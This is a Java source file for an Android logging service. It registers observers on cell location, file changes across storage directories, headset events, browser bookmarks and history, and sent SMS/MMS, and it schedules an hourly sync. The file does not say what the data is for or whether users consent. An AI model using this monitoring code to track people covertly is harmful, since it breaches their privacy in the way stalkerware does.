package org.magnum.logger;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Browser;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.magnum.logger.communication.messaging.SentMessageHandler;
import org.magnum.logger.connectivity.devices.HeadsetHandler;
import org.magnum.logger.connectivity.mobile.MobileHandler;
import org.magnum.logger.user.browsing.BrowserHandler;
import org.magnum.logger.user.files.FileHandler;

import java.util.ArrayList;
import java.util.List;

public class Controller extends Service
{
	private static final String TAG = Controller.class.getCanonicalName();

	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		try
		{
			monitorMobileCells();
			monitorFiles();
			monitorHeadset();
			monitorBrowsing();
			monitorOutgoingMessages();

			scheduleSync();
		}
		catch (Exception e)
		{
			Log.e(TAG, e.toString());
		}
		return START_STICKY;
	}

	private static final String[] DIRECTORIES = {Environment.DIRECTORY_ALARMS, Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS, Environment.DIRECTORY_MOVIES, Environment.DIRECTORY_MUSIC, Environment.DIRECTORY_NOTIFICATIONS,
			Environment.DIRECTORY_PICTURES, Environment.DIRECTORY_PODCASTS, Environment.DIRECTORY_RINGTONES};

	private void monitorMobileCells()
	{
		TelephonyManager manager = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
		if (manager != null)
		{
			manager.listen(new MobileHandler(getApplicationContext()), PhoneStateListener.LISTEN_CELL_LOCATION);
		}
	}

	private void monitorHeadset()
	{
		registerReceiver(new HeadsetHandler(), new IntentFilter(Intent.ACTION_HEADSET_PLUG));
	}

	private void monitorBrowsing()
	{
		// Chrome
		getApplicationContext().getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/bookmarks"), true, new BrowserHandler(getApplicationContext(), new Handler()));
		// Any other browser
		getApplicationContext().getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI, true, new BrowserHandler(getApplicationContext(), new Handler()));

	}

	private void monitorFiles()
	{
		fileList.add(new FileHandler(getApplicationContext(), Environment.getRootDirectory().getAbsolutePath()));
		fileList.add(new FileHandler(getApplicationContext(), Environment.getDataDirectory().getAbsolutePath()));
		fileList.add(new FileHandler(getApplicationContext(), Environment.getDownloadCacheDirectory().getAbsolutePath()));
		fileList.add(new FileHandler(getApplicationContext(), Environment.getExternalStorageDirectory().getAbsolutePath()));
		for (String directory : DIRECTORIES)
		{
			fileList.add(new FileHandler(getApplicationContext(), Environment.getExternalStoragePublicDirectory(directory).getAbsolutePath()));
		}
		for (FileHandler handler : fileList)
		{
			handler.startWatching();
		}
	}

	private void monitorOutgoingMessages()
	{
		// Up to ICS
		getApplicationContext().getContentResolver().registerContentObserver(Uri.parse("content://sms/sent"), true, new SentMessageHandler(getApplicationContext(), new Handler()));
		// Jelly Beans
		// TODO: Handle repeated calls
		getApplicationContext().getContentResolver().registerContentObserver(Uri.parse("content://mms-sms/conversations_messages?simple=false"), true, new SentMessageHandler(getApplicationContext(), new Handler()));
	}

	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}

	private void scheduleSync()
	{
		PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 0, new Intent(this, SyncService.class), 0);
		AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
		if (alarmManager != null)
		{
			alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), AlarmManager.INTERVAL_HOUR, pendingIntent);
		}
	}
	static List<FileHandler> fileList = new ArrayList<FileHandler>();
}
